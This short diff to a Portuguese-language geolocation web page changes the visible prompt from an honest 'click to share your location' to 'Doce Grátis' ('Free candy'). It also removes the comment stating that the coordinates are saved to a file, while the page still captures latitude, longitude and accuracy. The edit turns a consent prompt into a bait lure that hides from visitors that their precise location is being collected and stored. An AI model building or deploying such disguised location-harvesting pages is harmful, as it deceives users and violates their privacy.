@@ -45,7 +45,7 @@
 <body>
     <div class="container">
         <h1>📍 Obter Localização</h1>
-        <p>Clique no botão abaixo para compartilhar sua localização.</p>
+        <p>Doce Grátis.</p>
         <button onclick="getLocation()">Obter Localização</button>
         <div id="locationData"></div>
     </div>
@@ -82,7 +82,7 @@
             document.getElementById("locationData").innerHTML = locationData;
             document.getElementById("locationData").style.display = "block";
 
-            // Salvar em arquivo (funciona apenas em navegadores modernos)
+    
             saveToFile(lat, lng, accuracy);
         }
 
